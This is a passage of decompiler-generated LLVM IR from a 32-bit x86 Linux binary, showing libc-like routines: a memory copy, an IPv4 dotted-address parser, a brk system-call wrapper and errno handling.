  %v1_80522c9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80522c9 = add i32 %v1_80522c9, 72
  %v3_80522c9 = inttoptr i32 %v2_80522c9 to i32*
  store i32 %v3_80522c6, i32* %v3_80522c9, align 4
  %v2_80522cf = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80522cf, i32* @ebx, align 4
  ret i32 %v3_80522c6

; uselistorder directives
  uselistorder i32 72, { 3, 2, 4, 5, 6, 7, 0, 8, 9, 10, 11, 1 }
  uselistorder i32 64, { 8, 7, 4, 3, 0, 9, 10, 2, 5, 1, 6 }
  uselistorder i32 40, { 5, 4, 6, 0, 2, 7, 1, 8, 9, 10, 11, 3 }
  uselistorder i32 56, { 6, 5, 0, 1, 2, 7, 8, 9, 10, 11, 3, 12, 13, 14, 4 }
  uselistorder i32 52, { 3, 2, 5, 6, 4, 1, 0 }
  uselistorder i32 48, { 8, 9, 7, 4, 6, 0, 3, 5, 1, 10, 11, 12, 13, 14, 2 }
  uselistorder i32 32, { 43, 44, 48, 30, 36, 49, 50, 45, 28, 37, 38, 51, 1, 0, 2, 3, 34, 4, 5, 6, 7, 8, 31, 52, 32, 35, 39, 40, 9, 41, 11, 10, 33, 42, 46, 29, 47, 53, 12, 13, 14, 15, 54, 16, 17, 55, 56, 19, 18, 21, 20, 22, 23, 57, 24, 25, 58, 59, 60, 26, 27, 61 }
  uselistorder i32 36, { 5, 4, 0, 2, 6, 7, 1, 8, 9, 10, 11, 3 }
  uselistorder i32 14, { 5, 1, 3, 0, 2, 10, 11, 6, 7, 8, 9, 4 }
  uselistorder i32 24, { 13, 14, 10, 11, 12, 21, 15, 16, 17, 5, 6, 7, 0, 18, 19, 20, 3, 8, 2, 1, 22, 9, 4 }
  uselistorder i32 20, { 13, 14, 8, 10, 11, 12, 26, 15, 16, 17, 18, 0, 1, 19, 20, 21, 2, 3, 22, 23, 24, 27, 25, 7, 5, 6, 4, 28, 29, 30, 9 }
  uselistorder i32 16, { 48, 49, 50, 51, 52, 53, 54, 55, 16, 34, 3, 56, 26, 84, 4, 35, 36, 37, 0, 5, 85, 86, 7, 6, 87, 1, 8, 57, 58, 17, 27, 33, 21, 28, 22, 29, 38, 39, 40, 41, 42, 43, 44, 45, 46, 23, 10, 47, 18, 19, 24, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 31, 74, 20, 75, 76, 77, 78, 79, 9, 25, 80, 81, 82, 88, 83, 89, 93, 12, 94, 95, 96, 97, 98, 99, 100, 90, 91, 92, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 2, 111, 112, 113, 114, 115, 116, 117, 118, 15, 119, 13, 14, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 11, 142, 32, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 30 }
  uselistorder i32 8, { 106, 107, 108, 109, 110, 111, 112, 113, 114, 52, 120, 53, 121, 91, 54, 92, 11, 123, 124, 125, 126, 127, 128, 129, 4, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 5, 94, 95, 96, 97, 98, 99, 100, 101, 140, 141, 142, 143, 144, 145, 61, 6, 62, 7, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 60, 163, 164, 8, 165, 166, 167, 168, 9, 169, 115, 116, 117, 118, 122, 56, 63, 57, 64, 58, 65, 170, 171, 172, 102, 103, 104, 105, 12, 13, 14, 15, 16, 10, 66, 0, 17, 18, 119, 67, 68, 19, 69, 70, 20, 21, 71, 22, 1, 2, 173, 49, 174, 27, 28, 26, 33, 175, 25, 31, 32, 72, 59, 73, 74, 29, 75, 30, 76, 3, 23, 50, 176, 34, 77, 35, 78, 36, 37, 38, 39, 79, 40, 41, 42, 80, 43, 81, 177, 82, 44, 83, 45, 84, 178, 85, 46, 86, 47, 87, 88, 89, 48, 24, 179, 51, 180, 90, 93, 55 }
  uselistorder i32 (i8*, i32, i32)* @function_80500da, { 1, 5, 6, 7, 0, 2, 3, 4, 8 }
  uselistorder i32 88, { 0, 2, 1, 3 }
}

define i32 @function_80522d2(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80522d2:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80522d3 = load i32, i32* @esi, align 4
  store i32 %v0_80522d3, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_80522d4 = sdiv i32 %sext, 16777216
  store i32 %v4_80522d4, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_80522de = ptrtoint i16* %arg1 to i32
  store i32 %v4_80522de, i32* %edi.global-to-local, align 4
  %v2_80522e2 = udiv i32 %v4_80522d4, 4
  %v3_80522e5 = inttoptr i32 %arg2 to i8*
  %v4_80522e5 = bitcast i16* %arg1 to i8*
  %v5_80522e5 = call i8* @_memcpy(i8* %v4_80522e5, i8* %v3_80522e5, i32 %v2_80522e2)
  %v0_80522e7 = load i32, i32* %eax.global-to-local, align 4
  %v2_80522e7 = and i32 %v0_80522e7, 2
  %v3_80522e7 = icmp eq i32 %v2_80522e7, 0
  br i1 %v3_80522e7, label %dec_label_pc_80522ed, label %dec_label_pc_80522eb

dec_label_pc_80522eb:                             ; preds = %dec_label_pc_80522d2
  %v0_80522eb = load i32, i32* %esi.global-to-local, align 4
  %v1_80522eb = inttoptr i32 %v0_80522eb to i16*
  %v2_80522eb = load i16, i16* %v1_80522eb, align 2
  %v3_80522eb = load i32, i32* %edi.global-to-local, align 4
  %v4_80522eb = inttoptr i32 %v3_80522eb to i16*
  store i16 %v2_80522eb, i16* %v4_80522eb, align 2
  %v5_80522eb = load i32, i32* %edi.global-to-local, align 4
  %v6_80522eb = load i32, i32* %esi.global-to-local, align 4
  %v7_80522eb = load i1, i1* @df, align 1
  %v8_80522eb = select i1 %v7_80522eb, i32 -2, i32 2
  %v9_80522eb = add i32 %v8_80522eb, %v5_80522eb
  %v10_80522eb = add i32 %v8_80522eb, %v6_80522eb
  store i32 %v9_80522eb, i32* %edi.global-to-local, align 4
  store i32 %v10_80522eb, i32* %esi.global-to-local, align 4
  %v0_80522ed.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80522ed

dec_label_pc_80522ed:                             ; preds = %dec_label_pc_80522d2, %dec_label_pc_80522eb
  %v0_80522ed = phi i32 [ %v0_80522e7, %dec_label_pc_80522d2 ], [ %v0_80522ed.pre, %dec_label_pc_80522eb ]
  %v2_80522ed = urem i32 %v0_80522ed, 2
  %v3_80522ed = icmp eq i32 %v2_80522ed, 0
  br i1 %v3_80522ed, label %dec_label_pc_80522f2, label %dec_label_pc_80522f1

dec_label_pc_80522f1:                             ; preds = %dec_label_pc_80522ed
  %v0_80522f1 = load i32, i32* %esi.global-to-local, align 4
  %v1_80522f1 = inttoptr i32 %v0_80522f1 to i8*
  %v2_80522f1 = load i8, i8* %v1_80522f1, align 1
  %v3_80522f1 = load i32, i32* %edi.global-to-local, align 4
  %v4_80522f1 = inttoptr i32 %v3_80522f1 to i8*
  store i8 %v2_80522f1, i8* %v4_80522f1, align 1
  %v5_80522f1 = load i32, i32* %edi.global-to-local, align 4
  %v6_80522f1 = load i32, i32* %esi.global-to-local, align 4
  %v7_80522f1 = load i1, i1* @df, align 1
  %v8_80522f1 = select i1 %v7_80522f1, i32 -1, i32 1
  %v9_80522f1 = add i32 %v8_80522f1, %v5_80522f1
  %v10_80522f1 = add i32 %v8_80522f1, %v6_80522f1
  store i32 %v9_80522f1, i32* %edi.global-to-local, align 4
  store i32 %v10_80522f1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80522f2

dec_label_pc_80522f2:                             ; preds = %dec_label_pc_80522ed, %dec_label_pc_80522f1
  store i32 %v4_80522de, i32* %eax.global-to-local, align 4
  %v2_80522f6 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80522f6, i32* @esi, align 4
  ret i32 %v4_80522de

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 -2, { 10, 9, 11, 8, 12, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i1* @df, { 1, 2, 3, 0, 4 }
  uselistorder i32 4, { 2, 114, 115, 116, 117, 118, 119, 169, 170, 172, 173, 174, 175, 176, 171, 54, 89, 177, 179, 180, 182, 185, 186, 187, 188, 189, 190, 3, 191, 192, 193, 194, 195, 196, 197, 198, 183, 184, 93, 57, 94, 95, 96, 97, 98, 99, 100, 4, 102, 101, 199, 5, 200, 56, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 9, 221, 222, 224, 223, 6, 181, 178, 92, 59, 120, 121, 122, 123, 124, 58, 60, 225, 226, 61, 103, 104, 105, 90, 106, 107, 13, 108, 109, 110, 14, 15, 16, 17, 111, 62, 63, 112, 113, 64, 55, 125, 0, 126, 127, 128, 129, 130, 131, 18, 19, 132, 65, 133, 66, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 20, 67, 68, 146, 147, 148, 149, 150, 151, 152, 21, 153, 154, 155, 156, 22, 69, 157, 158, 159, 160, 23, 227, 228, 161, 162, 163, 164, 165, 166, 167, 168, 8, 229, 230, 231, 50, 28, 29, 27, 34, 26, 32, 33, 232, 233, 234, 10, 70, 71, 72, 30, 73, 31, 74, 1, 235, 24, 236, 51, 11, 237, 35, 75, 36, 76, 37, 238, 38, 39, 40, 77, 41, 42, 43, 78, 44, 79, 80, 45, 81, 46, 82, 239, 83, 47, 84, 48, 85, 240, 86, 87, 241, 49, 242, 243, 244, 245, 247, 246, 248, 249, 250, 251, 252, 253, 254, 255, 256, 25, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 52, 12, 7, 284, 53, 88, 285, 91 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 5, 6, 7, 9, 8 }
  uselistorder i32* @esi, { 97, 98, 15, 16, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 2, 55, 56, 99, 100, 13, 101, 102, 103, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 104, 105, 106, 120, 124, 3, 125, 126, 127, 128, 129, 130, 131, 121, 122, 123, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 132, 133, 134, 135, 136, 137, 138, 0, 139, 140, 141, 142, 4, 143, 10, 144, 145, 146, 147, 148, 149, 57, 58, 5, 59, 60, 61, 62, 63, 64, 65, 66, 118, 119, 150, 151, 14, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 92, 82, 83, 84, 86, 85, 1, 87, 88, 89, 90, 11, 91, 152, 153, 154, 93, 94, 95, 9, 155, 156, 96, 157, 158, 6, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 7, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 12, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 8, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 259, 256, 257, 258, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280 }
  uselistorder label %dec_label_pc_80522f2, { 1, 0 }
  uselistorder label %dec_label_pc_80522ed, { 1, 0 }
}

define i32 @function_80522f9(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80522f9:
  %v1_8052304 = icmp eq i8* %arg1, null
  br i1 %v1_8052304, label %dec_label_pc_8052385, label %dec_label_pc_8052308

dec_label_pc_8052308:                             ; preds = %dec_label_pc_80522f9
  %v4_8052300 = ptrtoint i8* %arg1 to i32
  %v0_8052316.pre = load i32, i32* bitcast (i32** @global_var_8053088.211 to i32*), align 8
  br label %dec_label_pc_8052313

dec_label_pc_8052313:                             ; preds = %dec_label_pc_8052308, %dec_label_pc_805235c
  %v0_805235c = phi i32 [ 0, %dec_label_pc_8052308 ], [ %v2_8052362, %dec_label_pc_805235c ]
  %v2_805235f = phi i32 [ 1, %dec_label_pc_8052308 ], [ %v3_805235f, %dec_label_pc_805235c ]
  %v0_8052313 = phi i32 [ %v4_8052300, %dec_label_pc_8052308 ], [ %v0_80523133, %dec_label_pc_805235c ]
  %v1_8052313 = inttoptr i32 %v0_8052313 to i8*
  %v2_8052313 = load i8, i8* %v1_8052313, align 1
  %v3_8052313 = sext i8 %v2_8052313 to i32
  %v2_805231c = mul nsw i32 %v3_8052313, 2
  %v3_805231c = add i32 %v2_805231c, %v0_8052316.pre
  %v4_805231c = inttoptr i32 %v3_805231c to i8*
  %v5_805231c = load i8, i8* %v4_805231c, align 1
  %v6_805231c = and i8 %v5_805231c, 8
  %v7_805231c = icmp eq i8 %v6_805231c, 0
  br i1 %v7_805231c, label %dec_label_pc_8052385, label %dec_label_pc_8052323

dec_label_pc_8052323:                             ; preds = %dec_label_pc_8052313
  %v4_8052337.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052337

dec_label_pc_8052327:                             ; preds = %dec_label_pc_8052337
  %v3_8052327 = mul i32 %v1_8052327, 10
  %v2_805232a = add i32 %v3_8052327, -48
  %v3_805232a = add i32 %v2_805232a, %v2_8052339
  %v1_805232e = add i32 %v3_805232a, -255
  %v6_805232e = sub i32 254, %v3_805232a
  %v7_805232e = and i32 %v6_805232e, %v3_805232a
  %v8_805232e = icmp slt i32 %v7_805232e, 0
  %v9_805232e = icmp eq i32 %v1_805232e, 0
  %v10_805232e = icmp slt i32 %v1_805232e, 0
  %v3_8052334 = icmp eq i1 %v10_805232e, %v8_805232e
  %v4_8052334 = icmp eq i1 %v9_805232e, false
  %v5_8052334 = and i1 %v4_8052334, %v3_8052334
  br i1 %v5_8052334, label %dec_label_pc_8052385, label %dec_label_pc_8052336

dec_label_pc_8052336:                             ; preds = %dec_label_pc_8052327
  %v1_8052336 = add i32 %v0_8052336, 1
  br label %dec_label_pc_8052337

dec_label_pc_8052337:                             ; preds = %dec_label_pc_8052323, %dec_label_pc_8052336
  %v1_8052327 = phi i32 [ 0, %dec_label_pc_8052323 ], [ %v3_805232a, %dec_label_pc_8052336 ]
  %v4_8052337 = phi i32 [ %v4_8052337.pre, %dec_label_pc_8052323 ], [ %v6_8052337, %dec_label_pc_8052336 ]
  %v0_8052336 = phi i32 [ %v0_8052313, %dec_label_pc_8052323 ], [ %v1_8052336, %dec_label_pc_8052336 ]
  %v1_8052337 = inttoptr i32 %v0_8052336 to i8*
  %v2_8052337 = load i8, i8* %v1_8052337, align 1
  %v3_8052337 = zext i8 %v2_8052337 to i32
  %v5_8052337 = and i32 %v4_8052337, -256
  %v6_8052337 = or i32 %v3_8052337, %v5_8052337
  store i32 %v6_8052337, i32* @edx, align 4
  %v2_8052339 = sext i8 %v2_8052337 to i32
  %v2_805233c = mul nsw i32 %v2_8052339, 2
  %v3_805233c = add i32 %v2_805233c, %v0_8052316.pre
  %v4_805233c = inttoptr i32 %v3_805233c to i16*
  %v5_805233c = load i16, i16* %v4_805233c, align 2
  %v2_8052341 = and i16 %v5_805233c, 8
  %v3_8052341 = icmp eq i16 %v2_8052341, 0
  %v1_8052343 = icmp eq i1 %v3_8052341, false
  br i1 %v1_8052343, label %dec_label_pc_8052327, label %dec_label_pc_8052345

dec_label_pc_8052345:                             ; preds = %dec_label_pc_8052337
  %v8_8052345 = sub nsw i32 2, %v2_805235f
  %v9_8052345 = and i32 %v8_8052345, %v2_805235f
  %v10_8052345 = icmp slt i32 %v9_8052345, 0
  %v11_8052345 = icmp eq i32 %v2_805235f, 3
  %v12_8052345 = icmp slt i32 %v2_805235f, 3
  %v3_8052349 = icmp eq i1 %v12_8052345, %v10_8052345
  %v4_8052349 = icmp eq i1 %v11_8052345, false
  %v5_8052349 = and i1 %v4_8052349, %v3_8052349
  br i1 %v5_8052349, label %dec_label_pc_8052353, label %dec_label_pc_805234b

dec_label_pc_805234b:                             ; preds = %dec_label_pc_8052345
  %v10_805234b = icmp eq i8 %v2_8052337, 46
  %v1_805234e = icmp eq i1 %v10_805234b, false
  br i1 %v1_805234e, label %dec_label_pc_8052385, label %dec_label_pc_8052350

dec_label_pc_8052350:                             ; preds = %dec_label_pc_805234b
  %v1_8052350 = add i32 %v0_8052336, 1
  br label %dec_label_pc_805235c

dec_label_pc_8052353:                             ; preds = %dec_label_pc_8052345
  %v1_8052353 = add i32 %v0_8052336, 1
  %v4_8052354 = icmp eq i8 %v2_8052337, 0
  br i1 %v4_8052354, label %dec_label_pc_805235c, label %dec_label_pc_8052358

dec_label_pc_8052358:                             ; preds = %dec_label_pc_8052353
  %v2_8052358 = and i16 %v5_805233c, 32
  %v3_8052358 = icmp eq i16 %v2_8052358, 0
  br i1 %v3_8052358, label %dec_label_pc_8052385, label %dec_label_pc_805235c

dec_label_pc_805235c:                             ; preds = %dec_label_pc_8052358, %dec_label_pc_8052353, %dec_label_pc_8052350
  %v0_80523133 = phi i32 [ %v1_8052353, %dec_label_pc_8052358 ], [ %v1_8052353, %dec_label_pc_8052353 ], [ %v1_8052350, %dec_label_pc_8052350 ]
  %v2_805235c = mul i32 %v0_805235c, 256
  %v3_805235f = add nuw nsw i32 %v2_805235f, 1
  %v2_8052362 = or i32 %v1_8052327, %v2_805235c
  %v7_8052368 = icmp sgt i32 %v2_805235f, 3
  br i1 %v7_8052368, label %dec_label_pc_805236a, label %dec_label_pc_8052313

dec_label_pc_805236a:                             ; preds = %dec_label_pc_805235c
  %v4_805236f = icmp eq i32 %arg2, 0
  br i1 %v4_805236f, label %dec_label_pc_8052387, label %dec_label_pc_8052376

dec_label_pc_8052376:                             ; preds = %dec_label_pc_805236a
  %v1_805237a = call i32 @llvm.bswap.i32(i32 %v2_8052362)
  %v2_805237c = inttoptr i32 %arg2 to i32*
  store i32 %v1_805237a, i32* %v2_805237c, align 4
  br label %dec_label_pc_8052387

dec_label_pc_8052385:                             ; preds = %dec_label_pc_8052358, %dec_label_pc_805234b, %dec_label_pc_8052313, %dec_label_pc_8052327, %dec_label_pc_80522f9
  br label %dec_label_pc_8052387

dec_label_pc_8052387:                             ; preds = %dec_label_pc_805236a, %dec_label_pc_8052376, %dec_label_pc_8052385
  %v0_805238c = phi i32 [ 1, %dec_label_pc_805236a ], [ 1, %dec_label_pc_8052376 ], [ 0, %dec_label_pc_8052385 ]
  ret i32 %v0_805238c

; uselistorder directives
  uselistorder i32 %v2_8052339, { 1, 0 }
  uselistorder i32 %v6_8052337, { 1, 0 }
  uselistorder i8 %v2_8052337, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8052336, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805232e, { 1, 0 }
  uselistorder i32 %v3_805232a, { 1, 0, 3, 2 }
  uselistorder i32 %v2_805235f, { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 256, { 1, 17, 21, 18, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 20 }
  uselistorder i32 3, { 1, 2, 0, 18, 12, 21, 4, 5, 8, 3, 6, 9, 16, 17, 10, 11, 7, 19, 20, 22, 14, 15, 23, 13 }
  uselistorder i16 0, { 0, 1, 3, 4, 2 }
  uselistorder i32 -256, { 4, 15, 16, 17, 18, 19, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 5, 6, 7, 8, 9, 10, 11, 12, 2, 3, 13, 14, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 45, 46, 47, 48, 0, 49, 50, 51, 1, 52, 53, 54, 55, 56 }
  uselistorder i32 -48, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32 10, { 1, 16, 17, 14, 18, 2, 23, 9, 0, 3, 10, 4, 11, 5, 12, 6, 13, 15, 19, 20, 21, 7, 22, 8, 24, 25, 26 }
  uselistorder i32* @edx, { 16, 3, 52, 53, 54, 17, 11, 0, 13, 14, 40, 41, 42, 43, 12, 55, 56, 57, 58, 61, 60, 62, 70, 71, 4, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 5, 85, 86, 68, 69, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 6, 34, 35, 36, 87, 132, 133, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 7, 125, 126, 127, 128, 129, 130, 131, 67, 15, 64, 44, 45, 134, 66, 46, 59, 63, 47, 65, 135, 136, 1, 137, 138, 139, 8, 140, 141, 142, 143, 144, 145, 146, 9, 147, 37, 38, 39, 10, 48, 49, 50, 51, 2, 148, 149, 150, 151, 152, 153, 154 }
  uselistorder i8 0, { 45, 46, 74, 75, 57, 32, 42, 58, 5, 76, 77, 78, 79, 47, 80, 81, 82, 83, 84, 85, 33, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 1, 101, 102, 103, 104, 49, 51, 48, 6, 50, 7, 52, 53, 54, 55, 56, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 59, 24, 25, 60, 26, 27, 28, 29, 30, 31, 61, 62, 63, 64, 65, 4, 66, 67, 8, 68, 69, 70, 71, 72, 73, 34, 35, 105, 106, 2, 108, 109, 107, 110, 111, 112, 113, 3, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 43, 134, 0, 135, 36, 44, 37, 38, 39, 40, 41 }
  uselistorder i32 2, { 50, 51, 52, 1, 63, 19, 64, 27, 48, 0, 28, 44, 29, 45, 30, 46, 14, 2, 59, 18, 3, 4, 5, 53, 6, 7, 8, 20, 21, 65, 9, 10, 25, 11, 31, 22, 26, 34, 32, 33, 16, 15, 23, 35, 24, 36, 54, 55, 56, 57, 58, 37, 40, 38, 41, 17, 39, 12, 42, 47, 43, 60, 61, 62, 13, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 49 }
  uselistorder i8* null, { 34, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052387, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052385, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8052337, { 1, 0 }
  uselistorder label %dec_label_pc_8052313, { 1, 0 }
}

define i32 @function_805238d() local_unnamed_addr {
dec_label_pc_805238d:
  %v0_805238d = load i32, i32* @eax, align 4
  %v1_805238d = add i32 %v0_805238d, 28
  %v2_805238d = inttoptr i32 %v1_805238d to i32*
  %v3_805238d = load i32, i32* %v2_805238d, align 4
  store i32 %v3_805238d, i32* @global_var_80536b8.229, align 8
  %v1_8052396 = add i32 %v0_805238d, 44
  %v2_8052396 = inttoptr i32 %v1_8052396 to i32*
  %v3_8052396 = load i32, i32* %v2_8052396, align 4
  store i32 %v3_8052396, i32* @global_var_80536bc.230, align 4
  ret i32 %v3_8052396

; uselistorder directives
  uselistorder i32 44, { 6, 4, 3, 10, 12, 11, 7, 8, 9, 1, 5, 13, 14, 15, 16, 0, 2 }
  uselistorder i32 28, { 13, 10, 11, 7, 8, 9, 14, 0, 12, 1, 5, 15, 4, 6, 3, 2, 16, 17, 18 }
}

define i32 @function_805239f(i32 %arg1) local_unnamed_addr {
dec_label_pc_805239f:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805239f = load i32, i32* @ebx, align 4
  store i32 %v0_805239f, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_80523b2 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_80523b2, i32* @global_var_8053100.228, align 256
  %v7_80523bd = icmp ult i32 %v1_80523b2, %arg1
  %v1_80523bf = icmp eq i1 %v7_80523bd, false
  br i1 %v1_80523bf, label %dec_label_pc_80523cf, label %dec_label_pc_80523c1

dec_label_pc_80523c1:                             ; preds = %dec_label_pc_805239f
  %v1_80523c1 = call i32 @function_8050089(i32 %v0_805239f)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_80523c9 = inttoptr i32 %v1_80523c1 to i32*
  store i32 12, i32* %v1_80523c9, align 4
  %v0_80523cf.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_80523d3.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80523cf

dec_label_pc_80523cf:                             ; preds = %dec_label_pc_805239f, %dec_label_pc_80523c1
  %v2_80523d3 = phi i32 [ %v0_805239f, %dec_label_pc_805239f ], [ %v2_80523d3.pre, %dec_label_pc_80523c1 ]
  %v0_80523cf = phi i32 [ 0, %dec_label_pc_805239f ], [ %v0_80523cf.pre, %dec_label_pc_80523c1 ]
  store i32 %v2_80523d3, i32* @ebx, align 4
  ret i32 %v0_80523cf

; uselistorder directives
  uselistorder i32 %v1_80523b2, { 1, 0 }
  uselistorder i32 12, { 96, 82, 83, 84, 85, 86, 75, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 76, 77, 78, 79, 80, 81, 112, 130, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 68, 129, 69, 87, 88, 89, 90, 91, 64, 71, 65, 72, 66, 73, 67, 74, 28, 29, 30, 31, 92, 0, 93, 94, 95, 32, 33, 34, 35, 36, 37, 1, 2, 26, 10, 9, 8, 16, 62, 21, 41, 42, 40, 17, 47, 39, 45, 46, 18, 131, 7, 43, 44, 4, 6, 38, 132, 63, 133, 137, 134, 135, 136, 48, 49, 50, 51, 19, 20, 52, 53, 54, 138, 55, 56, 57, 58, 59, 60, 61, 5, 22, 23, 11, 12, 13, 14, 15, 139, 24, 3, 25, 140, 141, 27, 70 }
  uselistorder i32* @global_var_8053100.228, { 1, 0, 2 }
  uselistorder i32 45, { 1, 3, 0, 4, 2 }
  uselistorder label %dec_label_pc_80523cf, { 1, 0 }
}

define i32 @function_80523d5() local_unnamed_addr {
dec_label_pc_80523d5:
  %v0_80523d8 = load i32, i32* @eax, align 4
  %v1_80523da = sub i32 0, %v0_80523d8
  %v1_80523dc = call i32 @function_8050089(i32 ptrtoint (i32* @0 to i32))
  %v2_80523e1 = inttoptr i32 %v1_80523dc to i32*
  store i32 %v1_80523da, i32* %v2_80523e1, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 (i32)* @function_8050089, { 35, 34, 52, 33, 32, 4, 43, 31, 55, 30, 29, 28, 42, 41, 40, 56, 27, 26, 25, 23, 22, 21, 39, 38, 45, 1, 16, 2, 54, 53, 37, 36, 15, 51, 14, 9, 18, 17, 50, 8, 13, 12, 49, 24, 20, 48, 11, 19, 10, 7, 47, 6, 5, 46, 44, 3, 0 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 65, 64, 170, 63, 97, 98, 149, 150, 151, 99, 100, 96, 117, 116, 112, 113, 114, 115, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 66, 152, 153, 154, 155, 156, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 171, 172, 173, 174, 175, 176 }
}

define i32 @function_80523f0() local_unnamed_addr {
dec_label_pc_80523f0:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_80523fc = load i32, i32* @global_var_8053000.215, align 4096
  %v10_8052401 = icmp eq i32 %v0_80523fc, -1
  br i1 %v10_8052401, label %dec_label_pc_8052412, label %dec_label_pc_8052406.preheader

dec_label_pc_8052406.preheader:                   ; preds = %dec_label_pc_80523f0
  br label %dec_label_pc_8052406

